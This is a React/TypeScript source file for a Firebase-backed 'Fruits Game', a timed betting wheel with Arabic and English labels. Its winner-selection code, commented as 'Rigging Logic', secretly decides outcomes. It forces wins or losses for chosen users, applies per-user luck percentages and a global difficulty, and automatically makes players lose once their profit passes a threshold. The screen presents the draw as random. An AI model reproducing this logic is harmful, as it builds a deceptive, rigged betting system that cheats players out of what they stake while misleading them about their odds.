
import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { db, auth } from '../firebase';
import { 
  doc, getDoc, updateDoc, setDoc, addDoc, collection, 
  serverTimestamp, increment, deleteDoc, onSnapshot 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
import { useLanguage } from '../LanguageContext';

interface FruitsGameProps {
  onClose: () => void;
  userBalance: number;
  onUpdateBalance: (amount: number) => void;
}

const GAME_FRUITS = [
  { id: 'orange', emoji: '🍊', name: 'برتقال', multiplier: 5 },
  { id: 'apple', emoji: '🍎', name: 'تفاح', multiplier: 5 },
  { id: 'lemon', emoji: '🍋', name: 'ليمون', multiplier: 5 },
  { id: 'peach', emoji: '🍑', name: 'خوخ', multiplier: 5 },
  { id: 'strawberry', emoji: '🍓', name: 'فراولة', multiplier: 10 },
  { id: 'mango', emoji: '🥭', name: 'مانجو', multiplier: 15 },
  { id: 'watermelon', emoji: '🍉', name: 'بطيخ', multiplier: 25 },
  { id: 'cherry', emoji: '🍒', name: 'كرز', multiplier: 45 },
];

const BET_AMOUNTS = [1000, 10000, 100000, 500000];

export const FruitsGame: React.FC<FruitsGameProps> = ({ onClose, userBalance, onUpdateBalance }) => {
  const { language, t } = useLanguage();
  const [gameState, setGameState] = useState<'betting' | 'drawing' | 'result'>('betting');
  const [timeLeft, setTimeLeft] = useState(25);
  const [selectedAmount, setSelectedAmount] = useState(1000);
  const [bets, setBets] = useState<Record<string, number>>({});
  const [highlightIdx, setHighlightIdx] = useState<number | null>(null);
  const [winningIdx, setWinningIdx] = useState<number | null>(null);
  const [history, setHistory] = useState<number[]>([]);

  // Rigging & Sync States
  const [globalSettings, setGlobalSettings] = useState<any>(null);
  const [userStats, setUserStats] = useState<any>(null);
  const userStatsRef = useRef<any>(null);
  const [activeBetIds, setActiveBetIds] = useState<string[]>([]);

  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // Sync Settings & Stats
  useEffect(() => {
    const unsubSettings = onSnapshot(doc(db, "settings", "fruitsGame"), (snap) => {
      if (snap.exists()) setGlobalSettings(snap.data());
    });

    let unsubStats: (() => void) | null = null;
    const unsubAuth = onAuthStateChanged(auth, (user) => {
      if (unsubStats) {
        unsubStats();
        unsubStats = null;
      }
      if (user) {
        unsubStats = onSnapshot(doc(db, "users", user.uid), (snap) => {
          if (snap.exists()) {
            const data = snap.data();
            setUserStats(data);
            userStatsRef.current = data;
          }
        });
      } else {
        setUserStats(null);
        userStatsRef.current = null;
      }
    });

    return () => {
      unsubSettings();
      unsubAuth();
      if (unsubStats) unsubStats();
    };
  }, []);

  // Cleanup Active Bets on Unmount
  useEffect(() => {
    return () => {
      activeBetIds.forEach(id => {
        deleteDoc(doc(db, "fruitsGameActiveBets", id)).catch(() => {});
      });
    };
  }, [activeBetIds]);

  // Handle Countdown
  useEffect(() => {
    if (gameState === 'betting') {
      if (timeLeft > 0) {
        timerRef.current = setTimeout(() => setTimeLeft(prev => prev - 1), 1000);
      } else {
        startDrawing();
      }
    }
    return () => { if (timerRef.current) clearTimeout(timerRef.current); };
  }, [timeLeft, gameState]);

  const startDrawing = () => {
    if (gameState !== 'betting') return;
    setGameState('drawing');
    
    // Rigging Logic
    const determineWinner = () => {
      const candidates = GAME_FRUITS.map((_, i) => i);
      const user = auth.currentUser;
      const stats = userStatsRef.current;
      if (!user || !globalSettings || !stats) return Math.floor(Math.random() * GAME_FRUITS.length);

      // Forced Win Override: If player has forced win status and has placed bets, ensure they win.
      const activeBetKeys = Object.keys(bets).filter(key => (bets[key] || 0) > 0);
      if (stats.fruitsForcedWin && activeBetKeys.length > 0) {
        const betIndices = GAME_FRUITS.map((fruit, idx) => ({ fruit, idx }))
          .filter(item => activeBetKeys.includes(item.fruit.id))
          .map(item => item.idx);
        if (betIndices.length > 0) {
          return betIndices[Math.floor(Math.random() * betIndices.length)];
        }
      }

      const luckPercent = stats.fruitsLuckPercent ?? 100;
      const threshold = globalSettings.lossThreshold ?? 10000000;
      const userProfit = (stats.fruitsTotalWin || 0) - (stats.fruitsTotalBet || 0);
      const isForcedLoss = stats.fruitsForcedLoss || userProfit >= threshold;
      const difficulty = globalSettings.globalDifficulty || 'balanced';

      // 1. Filter out winners if forced loss or luck fails
      const luckRoll = Math.floor(Math.random() * 100);
      const filteredCandidates = candidates.filter(idx => {
        const potentialWin = (bets[GAME_FRUITS[idx].id] || 0) * GAME_FRUITS[idx].multiplier;
        
        // If they would win but luck fails or forced loss is on
        if (potentialWin > 0) {
          if (isForcedLoss) return false;
          if (luckRoll > luckPercent) return false;
          if (difficulty === 'hard' && Math.random() > 0.3) return false;
        } else {
          if (difficulty === 'easy' && Math.random() > 0.5) return true; // Prefer non-empty if easy? No, normally balanced
        }
        return true;
      });

      // 2. Pick from safe candidates or fallback to random
      const finalPool = filteredCandidates.length > 0 ? filteredCandidates : candidates;
      return finalPool[Math.floor(Math.random() * finalPool.length)];
    };

    const winner = determineWinner();
    setWinningIdx(winner);

    let stepCount = 0;
    const totalSteps = 40 + winner; // Fixed rotations + winner index
    const initialSpeed = 80;
    
    const animate = (step: number) => {
      setHighlightIdx(step % GAME_FRUITS.length);
      
      if (step < totalSteps) {
        // Linear then exponential slowdown
        const remaining = totalSteps - step;
        let nextSpeed = initialSpeed;
        if (remaining < 15) nextSpeed += (15 - remaining) * 30;
        
        setTimeout(() => animate(step + 1), nextSpeed);
      } else {
        finishGame(winner);
      }
    };

    animate(0);
  };

  const finishGame = (winner: number) => {
    setGameState('result');
    setHistory(prev => [winner, ...prev].slice(0, 10));
    
    // Calculate Payout
    const winningFruit = GAME_FRUITS[winner];
    const betOnWinner = bets[winningFruit.id] || 0;
    const finalWin = betOnWinner * winningFruit.multiplier;
    const totalCurrentBet = Object.values(bets).reduce((a, b) => a + b, 0);

    if (finalWin > 0) {
      onUpdateBalance(finalWin);
    }

    // Run database calls completely in background without blocking the UI timer!
    const user = auth.currentUser;
    if (user) {
      (async () => {
        try {
          const batch: any = {
            fruitsTotalBet: increment(totalCurrentBet),
            fruitsTotalWin: increment(finalWin),
            fruitsRounds: increment(1)
          };
          await updateDoc(doc(db, "users", user.uid), batch);

          // Global Stats
          const profit = totalCurrentBet - finalWin;
          await setDoc(doc(db, "settings", "fruitsGame"), {
            totalRounds: increment(1),
            totalProfit24h: increment(profit)
          }, { merge: true });

          // Clear Active Bets
          activeBetIds.forEach(async (id) => {
            try {
              await deleteDoc(doc(db, "fruitsGameActiveBets", id));
            } catch (err) {}
          });
          setActiveBetIds([]);
        } catch (e) {
          console.error("Failed to update game stats in background", e);
        }
      })();
    }

    // Reset after showing result - this will ALWAYS run after exactly 3 seconds, unblocked by any database delay or user availability check!
    setTimeout(() => {
      setBets({});
      setWinningIdx(null);
      setHighlightIdx(null);
      setTimeLeft(25);
      setGameState('betting');
    }, 3000);
  };

  const handlePlaceBet = async (fruitId: string) => {
    if (gameState !== 'betting' || userBalance < selectedAmount) return;
    
    const user = auth.currentUser;
    if (!user) return;

    // Limit to 6 fruits maximum
    const currentBetFruits = Object.keys(bets);
    if (currentBetFruits.length >= 6 && !bets[fruitId]) {
      return; // Do nothing if trying to bet on a 7th fruit
    }

    onUpdateBalance(-selectedAmount);
    setBets(prev => ({
      ...prev,
      [fruitId]: (prev[fruitId] || 0) + selectedAmount
    }));

    // Register active bet for admin panel
    try {
      const betRef = await addDoc(collection(db, "fruitsGameActiveBets"), {
        userId: user.uid,
        userName: userStats?.displayName || "لاعب",
        fruitId,
        amount: selectedAmount,
        createdAt: serverTimestamp()
      });
      setActiveBetIds(prev => [...prev, betRef.id]);
    } catch (e) {}
  };

  const totalBet = Object.values(bets).reduce((a, b) => a + b, 0);

  return (
    <div className="fixed inset-0 z-[1000] flex flex-col justify-end animate-in fade-in duration-300">
      {/* Overlay - Clickable only when not in active game logic to avoid accidental close */}
      <div className="absolute inset-0 bg-black/20" onClick={() => { if(totalBet === 0 && gameState === 'betting') onClose(); }} />
      
      {/* Game Bottom Sheet */}
      <div className="relative w-full max-w-md mx-auto bg-purple-700/85 border-t border-white/20 rounded-t-[2.5rem] shadow-[0_-10px_40px_rgba(0,0,0,0.5)] flex flex-col overflow-hidden h-[85%]" dir={language === 'ar' ? 'rtl' : 'ltr'}>
        
        {/* Decorative Handle */}
        <div className="w-12 h-1.5 bg-white/20 rounded-full mx-auto mt-4 mb-2 flex-shrink-0"></div>

        {/* Header */}
        <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
           <div className="flex flex-col">
              <h2 className="text-sm font-black text-white tracking-widest leading-none text-start">{t("لعبة فواكه", "Fruits Game")}</h2>
              <div className="flex items-center gap-1 mt-1 justify-start">
                <i className="fas fa-coins text-yellow-500 text-[8px]"></i>
                <span className="text-[10px] font-black text-yellow-400">{userBalance.toLocaleString('en-US')}</span>
              </div>
           </div>
           <button onClick={onClose} className="w-8 h-8 rounded-lg bg-white/10 flex items-center justify-center text-white active:scale-90 transition-all border border-white/10">
             <i className="fas fa-times text-xs"></i>
           </button>
        </div>

        {/* Main Content */}
        <div className="flex-1 overflow-y-auto p-4 flex flex-col gap-6 scrollbar-hide">
          
          {/* Status Display Area */}
          <div className="bg-black/30 rounded-[2rem] p-6 flex flex-col items-center justify-center relative overflow-hidden border border-white/10 min-h-[140px]">
            {gameState === 'betting' && (
              <div className="flex flex-col items-center gap-1 animate-in zoom-in duration-300">
                <span className="text-[10px] font-black text-white/40 uppercase tracking-[0.2em]">{t("فترة الرهان", "Betting Period")}</span>
                <div className="text-5xl font-black text-white tabular-nums drop-shadow-xl">{timeLeft}</div>
                <span className="text-[8px] font-black text-white/20 uppercase tracking-widest">{t("ثانية", "Seconds")}</span>
              </div>
            )}
            
            {gameState === 'drawing' && (
              <div className="flex flex-col items-center gap-3 animate-pulse">
                <div className="text-2xl font-black text-white tracking-widest text-center">{t("جاري تحديد الفائز...", "Drawing winner...")}</div>
                <div className="flex gap-1">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="w-2 h-2 bg-yellow-500 rounded-full animate-bounce" style={{animationDelay: `${i * 0.2}s`}}></div>
                  ))}
                </div>
              </div>
            )}

            {gameState === 'result' && winningIdx !== null && (
              <motion.div 
                initial={{ scale: 0.5, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="flex flex-col items-center gap-1"
              >
                <div className="text-6xl drop-shadow-[0_0_20px_rgba(255,255,255,0.6)]">{GAME_FRUITS[winningIdx].emoji}</div>
                <span className="text-sm font-black text-yellow-400 mt-2">{t(GAME_FRUITS[winningIdx].name, GAME_FRUITS[winningIdx].id)} {t("هو الرابح!", "is the winner!")}</span>
                {bets[GAME_FRUITS[winningIdx].id] > 0 && (
                  <motion.div 
                    initial={{ y: 20, opacity: 0 }}
                    animate={{ y: 0, opacity: 1 }}
                    className="bg-green-500 text-white text-[10px] font-black px-4 py-1 rounded-full mt-2 shadow-lg shadow-green-500/40"
                  >
                    {t("مبارك! ربحت ", "Congratulations! You won ")}{(bets[GAME_FRUITS[winningIdx].id] * GAME_FRUITS[winningIdx].multiplier).toLocaleString('en-US')}
                  </motion.div>
                )}
              </motion.div>
            )}
          </div>

          {/* Fruit Grid */}
          <div className="grid grid-cols-4 gap-3">
             {GAME_FRUITS.map((fruit, idx) => {
               const myBet = bets[fruit.id] || 0;
               const isWinning = gameState === 'result' && winningIdx === idx;
               const isHighlighted = highlightIdx === idx;

               return (
                 <button
                   key={fruit.id}
                   disabled={gameState !== 'betting'}
                   onClick={() => handlePlaceBet(fruit.id)}
                   className={`aspect-square rounded-2xl relative transition-all duration-300 flex flex-col items-center justify-center gap-1 border-2 overflow-hidden shadow-lg
                     ${isHighlighted ? 'scale-105 border-yellow-400 bg-white/20 ring-4 ring-yellow-400/20 z-10' : 'border-white/5 bg-white/5'}
                     ${isWinning ? 'border-green-400 bg-green-500/20 ring-4 ring-green-400/30 shadow-[0_0_20px_rgba(34,197,94,0.4)]' : ''}
                     ${gameState !== 'betting' ? 'opacity-90' : 'active:scale-95 hover:bg-white/10'}
                   `}
                 >
                    <span className="text-3xl drop-shadow-md">{fruit.emoji}</span>
                    <div className="text-[10px] font-black text-white/50 uppercase tracking-tighter">
                      {t(fruit.name, fruit.id)}
                    </div>
                    <div className="text-[9px] font-black text-white/40 uppercase tracking-tighter">x{fruit.multiplier}</div>
                    
                    {myBet > 0 && (
                      <div className="absolute top-1 right-1 px-1.5 py-0.5 bg-yellow-500 text-black text-[7px] font-black rounded-md shadow-md">
                        {myBet >= 1000000 ? `${(myBet/1000000).toFixed(1)}M` : myBet >= 1000 ? `${(myBet/1000).toFixed(0)}k` : myBet}
                      </div>
                    )}
                 </button>
               )
             })}
          </div>

          {/* Bet Amount Selector */}
          <div className="space-y-4">
             <div className="flex justify-between items-center px-1">
                <span className="text-[10px] font-black text-white/40 uppercase tracking-widest">{t("اختر مبلغ الرهان", "Select Bet Amount")}</span>
                {totalBet > 0 && <span className="text-[10px] font-black text-yellow-400 uppercase tracking-widest">{t("المراهنة: ", "Bet: ")}{totalBet.toLocaleString('en-US')}</span>}
             </div>
             <div className="grid grid-cols-4 gap-2">
                {BET_AMOUNTS.map(amount => (
                   <button
                     key={amount}
                     onClick={() => setSelectedAmount(amount)}
                     className={`py-3 rounded-2xl text-xs font-black border transition-all shadow-sm
                       ${selectedAmount === amount ? 'bg-white text-purple-700 border-white shadow-white/20 scale-95' : 'bg-white/5 border-white/10 text-white/60 hover:bg-white/10'}
                     `}
                   >
                     {amount >= 1000000 ? `${amount/1000000}M` : `${amount/1000}k`}
                   </button>
                ))}
             </div>
          </div>

          {/* History */}
          <div className="mt-4 pb-4">
             <span className="text-[9px] font-black text-white/30 uppercase tracking-widest block mb-3 px-1">{t("النتائج السابقة", "Previous Results")}</span>
             <div className="flex gap-2 justify-center">
                {history.length > 0 ? history.map((idx, i) => (
                  <div key={i} className="w-8 h-8 rounded-xl bg-black/20 flex items-center justify-center text-lg border border-white/5 transition-all">
                    {GAME_FRUITS[idx].emoji}
                  </div>
                )) : (
                  <div className="text-[9px] font-black text-white/10 py-2">{t("بانتظار الجولة الأولى...", "Waiting for first round...")}</div>
                )}
             </div>
          </div>

        </div>

      </div>
    </div>
  );
};
